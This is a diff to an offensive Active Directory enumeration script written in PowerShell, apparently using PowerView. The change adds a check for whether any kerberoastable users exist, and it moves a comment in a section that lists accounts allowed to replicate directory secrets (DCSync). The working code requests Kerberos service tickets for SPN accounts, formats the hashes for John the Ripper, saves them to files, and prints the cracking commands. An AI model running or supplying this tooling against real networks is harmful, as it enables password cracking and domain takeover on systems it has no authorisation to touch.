@@ -425,16 +425,21 @@ Write-Banner -Text "Kerberoastable users members of DA"
 Get-DomainUser -SPN -Domain $Domain -Server $TargetDC | ?{$_.memberof -match $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | Output-Results -Path "$QuickWinsDir\kerberoastable_da" -Tee
 
 Write-Banner -Text "Kerberoasting all users"
+if($KerberoastableUsers){
+    foreach($KerberoastableUser in $KerberoastableUsers){
+        Invoke-Kerberoast -Domain $Domain -Server $TargetDC -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File "$KerberoastDir\$($KerberoastableUser.samaccountname).txt"
+    }
 
-foreach($KerberoastableUser in $KerberoastableUsers){
-    Invoke-Kerberoast -Domain $Domain -Server $TargetDC -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File "$KerberoastDir\$($KerberoastableUser.samaccountname).txt"
+    Write-Output "[saving tickets into ""$KerberoastDir\""]"
+    Write-Host -ForegroundColor yellow "`r`n[!] Now run:"
+    Write-Host -ForegroundColor yellow "    john --session=""Kerberoasting"" --wordlist=""$DicoPath"" $KerberoastDir\*"
+
+    Write-Host -ForegroundColor yellow "`r`n[!] On linux, before john, run:"
+    Write-Host -ForegroundColor yellow "    find /path/with/tickets -type f -name ""*.txt"" -print0 | xargs -0 dos2unix"    
+} else {
+    Write-Output "[+] No kerberoastable users"
 }
-Write-Output "[saving tickets into ""$KerberoastDir\""]"
-Write-Host -ForegroundColor yellow "`r`n[!] Now run:"
-Write-Host -ForegroundColor yellow "    john --session=""Kerberoasting"" --wordlist=""$DicoPath"" $KerberoastDir\*"
 
-Write-Host -ForegroundColor yellow "`r`n[!] On linux, before john, run:"
-Write-Host -ForegroundColor yellow "    find /path/with/tickets -type f -name ""*.txt"" -print0 | xargs -0 dos2unix"
 
 #
 # Kerberos delegation - unconstrained
@@ -500,12 +505,13 @@ if ((Get-Location).Path -eq "$CurDir"){
 {
     $AllReplACLs = (Get-AcL).Access | Where-Object {$_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'}
 
-    #Filter this list to RIDs above 1000 which will exclude well-known Administrator groups
     foreach ($ACL in $AllReplACLs)
     {
         $user = New-Object System.Security.Principal.NTAccount($ACL.IdentityReference)
         $SID = $user.Translate([System.Security.Principal.SecurityIdentifier])
         $RID = $SID.ToString().Split("f-")[7]
+
+        #Filter this list to RIDs above 1000 which will exclude well-known Administrator groups
         if([int]$RID -ge 1000)
         {
             Write-Output "[+] Permission to Sync AD granted to:" $ACL.IdentityReference
